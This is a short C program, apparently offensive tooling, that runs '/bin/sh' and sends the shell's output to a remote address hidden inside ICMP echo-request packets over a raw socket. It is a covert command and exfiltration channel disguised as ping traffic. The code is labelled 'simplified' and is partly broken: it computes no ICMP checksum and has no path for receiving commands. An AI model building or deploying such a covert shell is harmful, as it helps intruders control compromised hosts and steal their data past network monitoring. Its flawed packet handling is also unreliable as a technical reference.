#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

#define BUFFER_SIZE 1024
#define REMOTE_ADDR "127.0.0.1"

int main() {
    int sockfd;
    struct sockaddr_in sa;
    char buffer[BUFFER_SIZE];
    struct icmp *icmp_hdr;

    // Create a raw socket for ICMP
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Define the remote address
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);

    // Build ICMP Echo Request
    memset(buffer, 0, BUFFER_SIZE);
    icmp_hdr = (struct icmp *)buffer;
    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_id = htons(1234);
    icmp_hdr->icmp_seq = htons(1);

    // Shell execution logic (simplified)
    FILE *fp = popen("/bin/sh", "r");
    while (fgets(buffer + sizeof(struct icmp), BUFFER_SIZE - sizeof(struct icmp), fp)) {
        // Send shell output over ICMP
        sendto(sockfd, buffer, sizeof(struct icmp) + strlen(buffer + sizeof(struct icmp)), 0, (struct sockaddr *)&sa, sizeof(sa));
    }
    pclose(fp);
    close(sockfd);
    return 0;
}
